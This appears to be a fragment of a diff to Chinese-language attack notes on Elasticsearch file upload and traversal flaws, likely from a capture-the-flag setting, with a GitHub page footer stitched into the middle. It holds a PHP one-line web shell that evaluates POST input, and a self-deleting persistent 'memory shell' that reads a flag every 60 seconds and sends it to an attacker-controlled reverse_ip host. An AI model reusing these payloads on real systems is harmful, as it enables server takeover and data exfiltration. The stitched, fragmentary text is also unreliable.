@@ -9,10 +9,10 @@
 
 elasticsearch 文件上传的时候必须注意 斜杠 \ 的使用
 
-"<?php eval(\\\\$_POST[1]);?>hello"
+>"<?php eval(\\\\$_POST[1]);?>hello"
 
 内存马
-#file2 = "<?php unlink(\\\\$_SERVER[\'SCRIPT_FILENAME\']);ignore_user_abort(true);set_time_limit(0);while (true) {\\\\$x = file_get_contents(\'" + flag_ip + "\');file_get_contents(\'" + reverse_ip + "/recive.php?a=\'.\\\\$x);sleep(60);}?>"
+>file2 = "<?php unlink(\\\\$_SERVER[\'SCRIPT_FILENAME\']);ignore_user_abort(true);set_time_limit(0);while (true) {\\\\$x = file_get_contents(\'" + flag_ip + "\');file_get_contents(\'" + reverse_ip + "/recive.php?a=\'.\\\\$x);sleep(60);}?>"
 Contact GitHub API Training Shop Blog About
 © 2016 GitHub, Inc. Terms Privacy Security Status Help
 # elasticsearch travel漏洞
